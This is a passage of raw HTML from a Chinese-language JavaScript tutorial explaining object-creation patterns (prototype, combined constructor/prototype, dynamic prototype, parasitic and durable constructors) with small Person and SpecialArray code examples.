Person(){<br>}<br>Person.prototype = { &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">constructor</span>:Person, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">name</span>:<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">age</span>:<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>, &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">friends</span>:[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>], &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"box-sizing: border-box; color: rgb(0, 136, 0);\">sayName</span>:<span class=\"\" style=\"box-sizing: border-box;\">function</span>(){<br> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;}<br>}<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person1 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br><span class=\"\" style=\"box-sizing: border-box;\">var</span> person2 = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person();<br>person1.friends.push(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>);<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span>[<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“乾隆”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“康熙”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“嬴政”</span>]<br><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">//</span><span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">true</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子中，<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>对象有一个名为<span style=\"color: rgb(0, 128, 255);\">friends</span>的属性，该属性包含一个字符串数组。然后创建了两个<span style=\"color: rgb(0, 128, 255);\">Person</span>的实例，接着修改<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>引用的数组，向数组中添加一个字符串，由于数组存在于<span style=\"color: rgb(0, 128, 255);\">Person.prototype</span>中而不是<span style=\"color: rgb(0, 128, 255);\">person1</span>中，所以<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>也会被修改。但是一般每个对象都是要有属于自己的属性的，所以我们很少看到有人单独使用原型模式来创建对象。</p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p></section></section><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>四、组合使用构造函数模式和原型模式</strong></span><span style=\"color: rgb(136, 136, 136);\"></span><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义类型最常见的方式就是组合使用构造函数模式与原型模式。构造函数模式用于定义实例属性，原型模式用于定义方法和共享的属性。结果，每个实例都会有自己的一份实例属性的副本，但同时又共享着对方法的引用，最大限度的节省了内存。另外，这种混成模式还支持向构造函数传递参数；可谓是集两种模式之长。下面的代码重写了前面的例子：</span></p></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><section class=\"\" data-tools=\"135编辑器\" data-id=\"87859\" style=\"   box-sizing: border-box; \"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">function Person(name, age){ &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>];</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">Person.prototype = { &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;constructor</span>:Person, &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">&nbsp;&nbsp;&nbsp;&nbsp;sayName</span>:function(){</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"> &nbsp; &nbsp; &nbsp; &nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">var person2 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“bu”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">25</span>);</span></code></p><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span>[<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>, <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.friends === person2.friends); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">false</span></span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">console</span>.log(person1.sayName === person2.sayName); &nbsp; <span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">//</span><span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">true</span></span></code></p></pre></section></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，实例属性都是在构造函数中定义的，而由所有实例共享的属性<span style=\"color: rgb(0, 128, 255);\">constructor</span>和方法<span style=\"color: rgb(0, 128, 255);\">sayName()</span>则是在原型中定义的。所以修改了<span style=\"color: rgb(0, 128, 255);\">person1.friends</span>并不会改变<span style=\"color: rgb(0, 128, 255);\">person2.friends</span>，因为他们分别引用了不同的数组。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种构造函数与原型模式混成的模式，是目前在ECMAScript中使用最广泛、认同度最高的一种创建自定义类型的方法。可以说，这是用来定义引用的一种默认形式。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>五、动态原型模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;有其他OO语言经验的开发人员在看到独立的构造函数和原型时，很可能会感到非常的困惑。动态原型模式就是用来解决这个问题的一个方案，它把所有的信息都封装在了构造函数中，而通过构造函数中初始化原型（仅在必要的情况下），又保持了同时使用构造函数和原型的优点。换句话说，可以通过检查某个应该存在的方法是否有效，来决定是否要初始化原型。来看一个例子：</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"></span></p><section data-role=\"outer\" label=\"Powered by 135editor.com\" style=\"font-family: 微软雅黑;\"><pre class=\"\" name=\"code\" style=\" white-space: nowrap;  overflow-y: hidden; overflow-x: auto; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"color: rgb(0, 0, 136);\">function</span> Person<span class=\"\" style=\"color: rgb(102, 0, 102);\">(name, age)</span>{</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.name = name; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.age = age; &nbsp; &nbsp;</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;this</span>.friends = [<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“乾隆”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“康熙”</span>]; &nbsp; &nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(136, 0, 0);\">//注意if语句</span></span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">&nbsp;&nbsp;&nbsp;&nbsp;<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">if</span>(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">typeof</span> <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.sayName!=<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“function”</span>){<br>&nbsp;&nbsp;&nbsp;&nbsp;Person.prototype.sayName = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">function</span><span class=\"\" style=\"font-size: 14px; color: rgb(102, 0, 102);\">()</span>{ <br>&nbsp;&nbsp;&nbsp;&nbsp;alert(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">this</span>.name);<br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;} &nbsp; &nbsp;<br>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><p style=\"white-space: normal;\"><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">}</span></code><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">var</span> person1 = <span class=\"\" style=\"font-size: 14px; color: rgb(0, 0, 136);\">new</span> Person(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“wei”</span>,<span class=\"\" style=\"font-size: 14px; color: rgb(0, 102, 102);\">29</span>);</span></code></p><code class=\"\" style=\" display: block; background: transparent; color: inherit ; ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\">person1.friends.push(<span class=\"\" style=\"font-size: 14px; color: rgb(0, 136, 0);\">“嬴政”</span>);<br>person1.sayName();</span></code></pre></section><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意构造函数代码中的if语句，这里只在<span style=\"color: rgb(0, 128, 255);\">sayName()</span>方法不存在的情况下才会将它添加到原型中。这断代码只有在第一次调用构造函数的时候才会被执行。此后，原型已经被初始化，不需要再做什么修改。不过要记住，这里所做的修改能立即在所有实例中得到反映。因此，这种方法可以说确实非常完美。其中if语句检查的是初始化之后应该存在的任何方法和属性–不必再用一大堆if来检查每个属性和方法，只检查其中一个即可。对于采用这样模式创建的对象，还可以使用<span style=\"color: rgb(0, 128, 255);\">instanceof</span>操作符来确定他的类型。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;注意：使用动态原型模式时，不能使用对象字面量重写原型。如果在已经创建了实例的情况下重写原型，那么就会切断现有的实例与新原型之间的联系。</strong></span><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><strong><span style=\"color: rgb(247, 92, 47);\">六、寄生构造函数模式</span></strong></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><br></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;通常，在上述几种模式都不适合的情况下可以使用寄生构造函数模式。这种模式的基本思想是创建一个函数，该函数的作用仅仅是封装创建对象的代码，然后再返回新创建的对象，但从表面看，这个函数又很像典型的构造函数。来看一个例子：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">Person</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">(name, age, job)</span>{</span><br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; var</span> o = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Object</span>();<br>&nbsp; o.name = name;<br>&nbsp; o.age = age;<br> &nbsp; &nbsp;<br>&nbsp; o.job = job;<br> &nbsp; &nbsp;<br>&nbsp; o.sayName = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br>&nbsp; alert(<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.name);<br> &nbsp; &nbsp;} &nbsp; &nbsp;<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"> &nbsp; &nbsp; &nbsp;return</span> o;<br>}<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> person = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> Person(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“wei”</span>,<span class=\"\" style=\"color: rgb(0, 102, 102); box-sizing: border-box;\">29</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“banzhuan”</span>);<br>person.sayName(); &nbsp; <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//“wei”</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，<span style=\"color: rgb(0, 128, 255);\">Person</span>函数创建了一个对象，并以相应的属性和方法初始化该对象，然后返回了这个对象。除了使用<span style=\"color: rgb(0, 128, 255);\">new</span>操作符把使用的包装函数叫做构造函数之外，这个模式和工厂模式并没有多大的区别。构造函数在不返回值的情况下，会默认返回新对象的实例。而通过在构造函数的末尾添加一个<span style=\"color: rgb(0, 128, 255);\">return</span>语句，可以重写调用构造函数时返回的值。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个模式可以在特殊的情况下来为对象创建构造函数。假设我们想创建一个具有额外方法的特殊数组。由于不能直接修改Array构造函数，因此可以使用这个模式：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span> <span class=\"\" style=\"box-sizing: border-box;\">SpecialArray</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\"><br> &nbsp; &nbsp;//创建数组</span><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\"><br> &nbsp; &nbsp;var</span> values = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> <span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">Array</span>(); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加值</span><br> &nbsp; &nbsp;values.push.apply(values,<span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">arguments</span>); &nbsp; &nbsp;<br> &nbsp; &nbsp;<br> &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//添加方法</span><br> &nbsp; &nbsp;values.toPipedString = <span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">function</span><span class=\"\" style=\"color: rgb(102, 0, 102); box-sizing: border-box;\">()</span>{</span><br> &nbsp; &nbsp; &nbsp; &nbsp;<br>&nbsp; &nbsp; &nbsp;<span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">return</span> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">this</span>.join(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“|”</span>);<br>} &nbsp; &nbsp;<br> <br> <span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">&nbsp; &nbsp;//返回数组</span><br> <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">&nbsp; &nbsp;return</span> values;<br> }<br><span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">var</span> colors = <span class=\"\" style=\"color: rgb(0, 0, 136); box-sizing: border-box;\">new</span> SpecialArray(<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“red”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“blue”</span>,<span class=\"\" style=\"color: rgb(0, 136, 0); box-sizing: border-box;\">“green”</span>);<br>console.log(colors.toPipedString());<span class=\"\" style=\"color: rgb(136, 0, 0); box-sizing: border-box;\">//red|blue|green</span></span></code></pre><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在这个例子中，我们创建了一个名为<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>的构造函数。在这个函数的内部，首先创建了一个数组，然后<span style=\"color: rgb(0, 128, 255);\">push()</span>方法初始化了数组的值。随后又给数组实例添加了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法，用来返回以竖线分隔的数组值。最后将数组以函数的形式返回。接着，我们调用了<span style=\"color: rgb(0, 128, 255);\">SpecialArray</span>构造函数，传入了初始化的值，并调用了<span style=\"color: rgb(0, 128, 255);\">toPipedString()</span>方法。</span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于寄生构造函数模式，有一点需要声明：首先，返回的对象与构造函数或者构造函数的原型没有任何关系；也就是说，构造函数返回的对象与在构造函数外部创建的对象没有什么不同。为此，不能依赖instanceof操作符来确定对象的类型。由于存在这一的问题，我们建议在可以使用其他模式的情况下不要使用这种模式。<br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: center; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(247, 92, 47);\"><strong>七、稳妥构造函数模式</strong></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\"><br></span></p><p style=\"line-height: 1.75em; text-align: justify; margin-top: 10px; font-size: 14px; color: rgb(161, 161, 161); white-space: normal;\"><span style=\"color: rgb(136, 136, 136);\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;道格拉斯·克拉克福德发明了JavaScript中的稳妥对象这个概念。所谓<span style=\"color: rgb(247, 92, 47);\"><strong>稳妥对象，是指没有公共属性，而且其方法也不引用this对象</strong></span>。稳妥对象最适合在一些安全环境中（这些环境会禁止使用this和new），或者在防止数据被其他应用程序改动时使用。稳妥构造函数遵循的与寄生构造函数类似的模式，但又两点不同：一是新创建对象的实例方法不引用this；二是不使用new操作符调用构造函数。按照稳妥构造函数的要求，可以将前面的<span style=\"color: rgb(0, 128, 255);\">Person</span>构造函数重写如下：</span></p><pre class=\"\" name=\"code\" style=\" white-space: nowrap; word-wrap: break-word; box-sizing: border-box;  overflow-y: hidden; overflow-x: auto; margin-top: 0px; margin-bottom: 1.1em ; ; ; ; ; ; ; ; ; ; ; ; ; \"><code class=\"\" style=\" display: block; background: transparent; color: inherit; box-sizing: border-box ; ; ; ; ; ; ; \"><span style=\"font-size: 14px;\"><span class=\"\" style=\"box-sizing: border-box;\"><span class=\"\" style=\"color: rgb(0, 0, 